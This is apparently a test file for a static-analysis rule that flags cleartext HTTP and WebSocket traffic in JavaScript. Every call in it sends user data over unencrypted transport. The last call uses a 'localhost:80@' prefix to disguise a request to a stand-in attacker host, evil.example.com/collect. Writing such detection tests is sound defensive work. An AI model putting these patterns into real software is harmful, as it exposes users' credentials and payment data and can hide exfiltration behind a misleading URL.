const axios = require('axios');
const http = require('http');

async function send(user, host) {
  // ruleid: mois-2-05-cleartext-transport-js
  await fetch('http://api.example.com/login', { method: 'POST', body: JSON.stringify(user) });
  // ruleid: mois-2-05-cleartext-transport-js
  await axios.post('http://api.example.com/users', user);
  // ruleid: mois-2-05-cleartext-transport-js
  await axios.get(`http://${host}/profile?id=${user.id}`);
  // ruleid: mois-2-05-cleartext-transport-js
  http.get('http://' + host + '/status', (res) => res.resume());
  // ruleid: mois-2-05-cleartext-transport-js
  await axios({ method: 'post', url: 'http://pay.example.com/charge', data: user });
  const api = axios.create({
    // ruleid: mois-2-05-cleartext-transport-js
    baseURL: 'http://api.example.com',
    timeout: 1000,
  });
  // ruleid: mois-2-05-cleartext-transport-js
  const ws = new WebSocket('ws://chat.example.com/socket');
  // 같은 호스트처럼 보이지만 실제 호스트는 evil.example.com
  // ruleid: mois-2-05-cleartext-transport-js
  await fetch('http://localhost:80@evil.example.com/collect');
  return [api, ws];
}
